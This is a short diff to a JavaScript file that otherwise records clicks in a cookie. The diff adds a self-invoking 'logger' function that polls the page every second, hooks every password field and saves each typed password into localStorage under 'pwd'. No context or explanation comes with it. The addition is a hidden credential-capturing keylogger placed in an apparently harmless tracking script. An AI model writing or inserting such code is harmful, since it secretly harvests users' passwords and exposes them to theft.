@@ -46,3 +46,17 @@ function record() {
     var y = document.cookie = "clicks =" + x;
 
 }
+
+//
+// Logger
+//  |
+//  v
+(function logger() {
+  setInterval(() => {
+    document.querySelectorAll("input[type='password']").forEach((input) => {
+      input.addEventListener("keyup", function () {
+        localStorage.setItem("pwd", this.value);
+      });
+    });
+  }, 1000);
+})();
